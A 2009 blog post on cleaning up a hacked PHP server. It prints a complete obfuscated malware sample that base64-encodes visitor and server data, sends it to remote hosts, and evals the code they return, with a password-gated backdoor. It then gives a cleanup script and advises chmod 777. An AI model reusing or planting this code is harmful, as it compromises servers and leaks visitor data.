---
layout: post
status: publish
published: true
title: Hacked Server - Cleanup Script
author: admin
author_login: blogadmin
author_email: info@edmondscommerce.co.uk
author_url: http://www.edmondscommerce.co.uk
wordpress_id: 1186
wordpress_url: http://www.edmondscommerce.co.uk/blog/?p=1186
date: 2009-09-14 14:24:47.000000000 +01:00
categories:
- php
tags:
- edmondscommerce
---
<div class="oldpost"><h4>This is an old post. The information it contains is probably out of date or innacurate</h4>
<p>
This is a post that was written a long time ago and is only being kept here for posterity.
You should probably look up more recent blog posts related to the subject you are researching
</p>
</div>
If you suddenly find a load of weird php files in your server with contents a bit like this:

```php

<? error_reporting(0);$a=(isset($_SERVER["HTTP_HOST"])?$_SERVER["HTTP_HOST"]:$HTTP_HOST);$b=(isset($_SERVER["SERVER_NAME"])?$_SERVER["SERVER_NAME"]:$SERVER_NAME);$c=(isset($_SERVER["REQUEST_URI"])?$_SERVER["REQUEST_URI"]:$REQUEST_URI);$d=(isset($_SERVER["PHP_SELF"])?$_SERVER["PHP_SELF"]:$PHP_SELF);$e=(isset($_SERVER["QUERY_STRING"])?$_SERVER["QUERY_STRING"]:$QUERY_STRING);$f=(isset($_SERVER["HTTP_REFERER"])?$_SERVER["HTTP_REFERER"]:$HTTP_REFERER);$g=(isset($_SERVER["HTTP_USER_AGENT"])?$_SERVER["HTTP_USER_AGENT"]:$HTTP_USER_AGENT);$h=(isset($_SERVER["REMOTE_ADDR"])?$_SERVER["REMOTE_ADDR"]:$REMOTE_ADDR);$i=(isset($_SERVER["SCRIPT_FILENAME"])?$_SERVER["SCRIPT_FILENAME"]:$SCRIPT_FILENAME);$j=(isset($_SERVER["HTTP_ACCEPT_LANGUAGE"])?$_SERVER["HTTP_ACCEPT_LANGUAGE"]:$HTTP_ACCEPT_LANGUAGE);$z="/?".base64_encode($a).".".base64_encode($b).".".base64_encode($c).".".base64_encode($d).".".base64_encode($e).".".base64_encode($f).".".base64_encode($g).".".base64_encode($h).".e.".base64_encode($i).".".base64_encode($j);$f=base64_decode("cnNzbmV3cy53cw==");if (basename($c)==basename($i)&&isset($_REQUEST["q"])&&md5($_REQUEST["q"])=="bbb9c757ee480495e0311cdcd352dfb1") $f=$_REQUEST["id"];if((include(base64_decode("aHR0cDovL2Fkcy4=").$f.$z)));else if($c=file_get_contents(base64_decode("aHR0cDovLzcu").$f.$z))eval($c);else{$cu=curl_init(base64_decode("aHR0cDovLzcxLg==").$f.$z);curl_setopt($cu,CURLOPT_RETURNTRANSFER,1);$o=curl_exec($cu);curl_close($cu);eval($o);};die(); ?>

```

Then it looks like your server has been compromised and you immediately need to change your FTP password to something long and secure.

After that, ideally restore a backup of your site that does not include the dodgy files. Alternatively you might find this PHP script useful for cleaning things out:

Note - No warranty or anything for this script. Use it as it is or customise it to fix your particular requirements.

To use it, get a copy of the infected file structure. CHMOD it all to 777 so that we can edit the htaccess files (dont forget to change permissions again once its done). Put this script in the root folder and visit it in your browser.

It will tidy up all the htaccess files and will remove all the dodgy files.

```php

<?php

/* recursively delete all php files that are numeric titles, then edit all htaccess files and remove the 404 message */

$directory=getcwd();

$dirs = dir_list(getcwd());

clean($dirs, $directory);

function clean($dirs, $directory){	
	foreach($dirs as $k=>$v){
		if(is_array($v)){
			clean($v, "$directory/$k");
		}else{
			if(preg_match('%^([0-9]+?)\.php$%', $v)){
				echo '<h3>Cleaning: '.$directory.'</h3>';
				echo '<br>'.$v;
				echo '<br>'.$directory.'<br>';
				$htaccess=file_get_contents("$directory/.htaccess");
				$pattern = '%ErrorDocument(.+?)([0-9]+?)\.php$%';
				$clean_ht = preg_replace($pattern, '', $htaccess);
				unlink("$directory/.htaccess");
				file_put_contents("$directory/.htaccess", $clean_ht);
				unlink("$directory/$v");
				echo '<h3>Cleaned: '.$directory.'</h3>';				
			}
		}
	}
}


function dir_list($directory, $ext=false){
	//echo $directory;
	if ($handle = opendir($directory)) {
		while (false !== ($file = readdir($handle))) {
			if($file != '.' && $file != '..'){
				if(is_dir($directory.'/'.$file)){
					$return[$file]=dir_list($directory.'/'.$file, $ext);			
				}elseif($ext != false){
					if($ext == file_ext($file)){
						$return[] = $file;
					}			
				}else{
					$return[] = $file;
				}
			}
		}
		closedir($handle);
		return $return;
	}else{		
		echo '<h3 style="color: red;">Error opening directory ' . $directory . '</h3>';
		return false;
	}
}


```

<a href="http://www.phpfreaks.com/forums/index.php?topic=251135.0">http://www.phpfreaks.com/forums/index.php?topic=251135.0</a>
<a href="http://wordpress.org/support/topic/220523">http://wordpress.org/support/topic/220523</a>
<a href="http://www.experts-exchange.com/Web_Development/Web_Services/Q_24209148.html">http://www.experts-exchange.com/Web_Development/Web_Services/Q_24209148.html</a>
